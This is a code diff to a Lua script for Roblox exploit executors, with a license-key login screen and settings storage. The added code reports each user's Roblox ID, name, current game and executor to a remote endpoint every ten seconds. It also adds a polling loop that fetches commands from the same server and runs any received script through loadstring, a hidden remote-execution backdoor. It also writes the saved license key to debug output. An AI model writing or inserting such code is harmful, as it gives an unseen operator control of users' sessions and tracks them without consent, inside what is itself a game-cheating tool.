@@ -22,34 +22,103 @@ local SETTINGS_FILE = "yousuck_settings.json"
 local VALIDATION_URL = "https://yoursuck.vercel.app/api/verify-key"
 local CLIENT_HEARTBEAT_URL = "https://yoursuck.vercel.app/api/clients"
 local heartbeatStarted = false
+local savedKeyHandled = false
+
+-- Print heartbeat endpoint for debugging
+debugPrint("CLIENT_HEARTBEAT_URL=", CLIENT_HEARTBEAT_URL)
+
+local function hasFileReadApi()
+    return type(readfile) == "function" or type(read_file) == "function"
+end
+
+local function hasFileWriteApi()
+    return type(writefile) == "function" or type(write_file) == "function"
+end
+
+local function isFile(path)
+    if type(isfile) == "function" then return isfile(path) end
+    if type(is_file) == "function" then return is_file(path) end
+    return false
+end
+
+local function readFile(path)
+    if type(readfile) == "function" then
+        return pcall(readfile, path)
+    end
+    if type(read_file) == "function" then
+        return pcall(read_file, path)
+    end
+    return false, nil
+end
+
+local function writeFile(path, contents)
+    if type(writefile) == "function" then
+        return pcall(writefile, path, contents)
+    end
+    if type(write_file) == "function" then
+        return pcall(write_file, path, contents)
+    end
+    return false
+end
 
 local function getSavedKey()
-    if type(readfile) == "function" and type(isfile) == "function" then
-        if isfile(KEY_FILE) then
-            local ok, content = pcall(readfile, KEY_FILE)
-            if ok and type(content) == "string" then
-                return content:gsub("^%s*(.-)%s*$", "%1")
-            end
+    if not hasFileReadApi() then
+        debugPrint("SavedKey: no file read API available")
+        return nil
+    end
+
+    if isFile(KEY_FILE) then
+        local ok, content = readFile(KEY_FILE)
+        if ok and type(content) == "string" then
+            local key = content:gsub("^%s*(.-)%s*$", "%1")
+            debugPrint("SavedKey: read from file", key)
+            return key
+        end
+        debugPrint("SavedKey: readfile failed or returned invalid content")
+    else
+        debugPrint("SavedKey: key file missing", KEY_FILE)
+        -- attempt direct read without isFile if possible
+        local ok, content = readFile(KEY_FILE)
+        if ok and type(content) == "string" then
+            local key = content:gsub("^%s*(.-)%s*$", "%1")
+            debugPrint("SavedKey: read from file without isfile", key)
+            return key
         end
     end
     return nil
 end
 
 local function saveKey(key)
-    if type(writefile) == "function" and key ~= "test" then
-        pcall(writefile, KEY_FILE, key)
+    if key == "test" then return end
+    if not hasFileWriteApi() then
+        debugPrint("SavedKey: no file write API available")
+        return
+    end
+    local ok = writeFile(KEY_FILE, key)
+    if not ok then
+        debugPrint("SavedKey: writefile failed")
     end
 end
 
 local function getSavedSettings()
-    if type(readfile) == "function" and type(isfile) == "function" then
-        if isfile(SETTINGS_FILE) then
-            local ok, content = pcall(readfile, SETTINGS_FILE)
-            if ok and type(content) == "string" then
-                local decodeOk, data = pcall(function() return HttpService:JSONDecode(content) end)
-                if decodeOk and type(data) == "table" then
-                    return data
-                end
+    if not hasFileReadApi() then
+        return {}
+    end
+
+    if isFile(SETTINGS_FILE) then
+        local ok, content = readFile(SETTINGS_FILE)
+        if ok and type(content) == "string" then
+            local decodeOk, data = pcall(function() return HttpService:JSONDecode(content) end)
+            if decodeOk and type(data) == "table" then
+                return data
+            end
+        end
+    else
+        local ok, content = readFile(SETTINGS_FILE)
+        if ok and type(content) == "string" then
+            local decodeOk, data = pcall(function() return HttpService:JSONDecode(content) end)
+            if decodeOk and type(data) == "table" then
+                return data
             end
         end
     end
@@ -57,11 +126,18 @@ local function getSavedSettings()
 end
 
 local function saveSettings(settings)
-    if type(writefile) == "function" then
-        local ok, content = pcall(function() return HttpService:JSONEncode(settings) end)
-        if ok then
-            pcall(writefile, SETTINGS_FILE, content)
+    if not hasFileWriteApi() then
+        debugPrint("Settings: no file write API available")
+        return
+    end
+    local ok, content = pcall(function() return HttpService:JSONEncode(settings) end)
+    if ok then
+        local saved = writeFile(SETTINGS_FILE, content)
+        if not saved then
+            debugPrint("Settings: writefile failed")
         end
+    else
+        debugPrint("Settings: failed to encode JSON")
     end
 end
 
@@ -94,7 +170,13 @@ local function getGameName()
         return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
     end)
     if ok and type(info) == "table" and type(info.Name) == "string" and info.Name ~= "" then
-        name = info.Name
+        return info.Name
+    end
+    if typeof(game) == "table" and type(game.Name) == "string" and game.Name ~= "" then
+        return tostring(game.Name)
+    end
+    if type(game.PlaceId) == "number" and game.PlaceId > 0 then
+        return "Place " .. tostring(game.PlaceId)
     end
     return name
 end
@@ -108,11 +190,14 @@ local function startClientHeartbeat()
     local uptime = 0
     task.spawn(function()
         while true do
+            local currentGame = getGameName()
             local payload = {
                 robloxId = tostring(LocalPlayer.UserId or ""),
                 robloxName = tostring(LocalPlayer.Name or "Player"),
-                gameName = getGameName(),
+                gameName = currentGame,
+                placeName = currentGame,
                 gameId = tostring(game.PlaceId or ""),
+                placeId = tostring(game.PlaceId or ""),
                 uptime = uptime,
                 executor = getExecutorName(),
                 executorVersion = tostring((syn and syn.version) or "")
@@ -130,6 +215,50 @@ local function startClientHeartbeat()
             end
             uptime = uptime + 10
             task.wait(10)
+        end
+    end)
+    -- start command polling (kick / execute)
+    task.spawn(function()
+        while true do
+            local pollUrl = CLIENT_HEARTBEAT_URL .. "?commands=1&robloxId=" .. tostring(LocalPlayer.UserId or "")
+            local success, body = safeGet(pollUrl)
+            if not success then
+                debugPrint("CommandPoll: safeGet failed or no response")
+            else
+                if type(body) == "string" and body ~= "" then
+                    local decodedOk, data = pcall(function() return HttpService:JSONDecode(body) end)
+                    if decodedOk and type(data) == "table" and data.commands and #data.commands > 0 then
+                        debugPrint("CommandPoll: received", #data.commands, "commands")
+                        for _, cmd in ipairs(data.commands) do
+                            debugPrint("CommandPoll: cmd", tostring(cmd.type))
+                            pcall(function()
+                                if cmd.type == "kick" then
+                                    debugPrint("CommandPoll: kicking player")
+                                    if LocalPlayer and typeof(LocalPlayer.Kick) == "function" then
+                                        LocalPlayer:Kick("Kicked by admin panel")
+                                    end
+                                elseif cmd.type == "ban" then
+                                    debugPrint("CommandPoll: ban command received")
+                                    if LocalPlayer and typeof(LocalPlayer.Kick) == "function" then
+                                        LocalPlayer:Kick("Banned by admin panel")
+                                    end
+                                elseif cmd.type == "execute" and type(cmd.script) == "string" and cmd.script ~= "" then
+                                    debugPrint("CommandPoll: executing script")
+                                    local fnOk, fn = pcall(function() return loadstring(cmd.script) end)
+                                    if fnOk and type(fn) == "function" then
+                                        task.spawn(function() pcall(fn) end)
+                                    else
+                                        debugPrint("CommandPoll: loadstring failed", tostring(fn))
+                                    end
+                                else
+                                    debugPrint("CommandPoll: unknown command type", tostring(cmd.type))
+                                end
+                            end)
+                        end
+                    end
+                end
+            end
+            task.wait(3)
         end
     end)
 end
@@ -1250,6 +1379,7 @@ local function make(class, props)
 end
 
 local savedKey = getSavedKey()
+debugPrint("SavedKey loaded:", tostring(savedKey))
 
 local Overlay = make("Frame", { 
     Name = "KeyOverlay", 
@@ -1333,6 +1463,7 @@ function Window:SetKeyValidator(fn) self._keyValidator = fn end
 function Window:KeyValidationResult(valid, message)
     debugPrint("KeyValidationResult called", tostring(valid), tostring(message))
     if valid then
+        savedKeyHandled = true
         if not heartbeatStarted then
             debugPrint("KeyValidationResult: starting heartbeat")
             heartbeatStarted = true
@@ -1715,7 +1846,6 @@ end })
 
 if savedKey and savedKey ~= "" then
     setStatus("Validating saved key...")
-    showKeyOverlay(false)
     task.spawn(function()
         task.wait(0.2)
         debugPrint("SavedKey: starting validation for key", tostring(savedKey))
@@ -1727,20 +1857,25 @@ if savedKey and savedKey ~= "" then
         end)
         debugPrint("SavedKey validation pcall result", tostring(success), tostring(res))
 
+        -- If the validator already invoked the callback successfully, accept that regardless of pcall error
+        if Window.KeyValidated == true then
+            debugPrint("SavedKey: already validated via callback (post-pcall)")
+            if not heartbeatStarted then
+                heartbeatStarted = true
+                startClientHeartbeat()
+            end
+            return
+        end
+
         -- If validator returned synchronously, handle that immediately
         if success and type(res) == "boolean" then
             debugPrint("SavedKey: validator returned synchronously", tostring(res))
             if res == true then
-                if not heartbeatStarted then
-                    heartbeatStarted = true
-                    startClientHeartbeat()
-                end
-                return
-            else
-                showKeyOverlay(true)
-                setStatus("Saved key is invalid or expired.")
+                Window:KeyValidationResult(true, "Saved key accepted.")
                 return
             end
+            Window:KeyValidationResult(false, "Saved key is invalid or expired.")
+            return
         end
 
         -- Wait for async callback to call Window:KeyValidationResult, up to timeout
@@ -1782,12 +1917,13 @@ if savedKey and savedKey ~= "" then
 
         if offline then
             debugPrint("SavedKey: offline detected, using cached login")
-            setStatus("Saved key could not be verified, using cached login.")
-            Window.KeyValidated = true
-            if not heartbeatStarted then
-                heartbeatStarted = true
-                startClientHeartbeat()
-            end
+            savedKeyHandled = true
+            Window:KeyValidationResult(true, "Saved key could not be verified, using cached login.")
+            return
+        end
+
+        if savedKeyHandled or Window.KeyValidated or heartbeatStarted then
+            debugPrint("SavedKey: already handled after timeout, skipping invalidation")
             return
         end
 
@@ -1809,17 +1945,30 @@ Window:SetOpen(true)
 task.spawn(function()
     task.wait(0.5)
     debugPrint("ConnectivityTest: hasRequestApi?", tostring(hasRequestApi()))
-    local ok, body = pcall(function() return safeGet(CLIENT_HEARTBEAT_URL) end)
-    if not ok then
-        debugPrint("ConnectivityTest: safeGet threw", tostring(body))
+    local success, body = safeGet(CLIENT_HEARTBEAT_URL)
+    if not success then
+        debugPrint("ConnectivityTest: safeGet failed")
     else
-        -- safeGet returns (ok, body) sometimes
-        if type(body) == "table" then
-            debugPrint("ConnectivityTest: safeGet result table", tostring(body))
-        else
-            local innerOk = tostring(body and (type(body) == "string" and "len=" .. tostring(#body) or tostring(body)) or "nil")
-            debugPrint("ConnectivityTest: safeGet returned", innerOk)
-        end
+        debugPrint("ConnectivityTest: safeGet returned", type(body), tostring(body and (type(body) == "string" and "len=" .. tostring(#body) or tostring(body)) or "nil"))
+    end
+end)
+
+-- One-time POST connectivity test (should not interfere with normal operation)
+task.spawn(function()
+    task.wait(1)
+    if not hasRequestApi() then
+        debugPrint("PostConnectivity: no request API available, skipping POST test")
+        return
+    end
+    local ok, res = pcall(function() return safePost(CLIENT_HEARTBEAT_URL, { test = true, robloxId = tostring(LocalPlayer.UserId) }) end)
+    if not ok then
+        debugPrint("PostConnectivity: safePost threw", tostring(res))
+        return
+    end
+    if type(res) == "string" then
+        debugPrint("PostConnectivity: safePost returned string len=", tostring(#res))
+    else
+        debugPrint("PostConnectivity: safePost returned", tostring(res))
     end
 end)
 
